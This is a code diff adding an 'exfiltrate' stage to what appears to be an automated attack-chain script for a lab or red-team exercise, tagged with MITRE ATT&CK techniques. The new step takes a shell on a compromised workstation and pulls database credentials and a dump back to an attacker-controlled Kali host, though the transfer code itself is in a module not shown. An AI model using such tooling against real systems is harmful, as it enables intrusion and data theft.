@@ -71,6 +71,11 @@ STEP_META = {
         "techniques": ["T1021.004", "T1078"],
         "color": "magenta",
     },
+    "exfiltrate": {
+        "tactic": "TA0009 · Collection · TA0010 · Exfiltration",
+        "techniques": ["T1552.001", "T1213", "T1041"],
+        "color": "red",
+    },
     "cleanup": {"tactic": "operator hygiene", "techniques": [], "color": "green"},
 }
 
@@ -273,6 +278,23 @@ def _step_lateral(ctx: Context) -> dict[str, Any]:
     return {"john_shell": john_shell}
 
 
+def _step_exfiltrate(ctx: Context) -> dict[str, Any]:
+    from exfiltrate_db import run as exfiltrate_run
+
+    result = exfiltrate_run(
+        john_shell=ctx.state["john_shell"],
+        kali_host=ctx.kali_host,
+        db_creds=ctx.state.get("db_creds"),   # set by enumeration_john_ws if it ran
+    )
+    if not result.get("exfil_ok"):
+        raise RuntimeError("exfiltration transfer failed — dump not received on kali")
+    return {
+        "db_creds":    result["db_creds"],
+        "exfil_path":  result["exfil_path"],
+        "exfil_stats": result["stats"],
+    }
+
+
 def _teardown_close_socket(key: str) -> Callable[[Context], None]:
     def _close(ctx: Context) -> None:
         sock = ctx.state.get(key)
@@ -313,6 +335,11 @@ CHAIN_BASIC: list[Step] = [
         _step_lateral,
         requires=("root_shell",),  # john_ip optional: used if present, else deploy.log fallback
         teardown=_teardown_close_socket("john_shell"),
+    ),
+    Step(
+        "exfiltrate",
+        _step_exfiltrate,
+        requires=("john_shell",),
     ),
 ]
 
